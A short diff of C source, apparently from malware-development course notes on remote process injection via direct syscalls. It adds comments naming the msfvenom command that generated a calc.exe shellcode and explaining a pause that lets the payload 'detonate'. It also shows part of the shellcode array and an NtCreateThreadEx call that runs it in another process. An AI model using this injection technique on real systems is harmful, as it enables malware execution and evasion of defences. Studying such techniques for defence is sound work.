@@ -8,6 +8,7 @@ Maldev Academy Notes
 Remote Process Injection via syscall
 */
 
+// Payload - msfvenom -p windows/x64/exec CMD=calc.exe -f c 
 unsigned char shellcode[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
 	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2,
@@ -89,6 +90,7 @@ int main() {
 	// Launch the shellcode in a new thread
 	pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, NULL, NULL, NULL, NULL, NULL);
 
+	// Using this to give enough time for payload to detonate. Or the main thread will exit prematurely.
 	printf("[#] Press <Enter> To Quit ... ");
 	getchar();
 
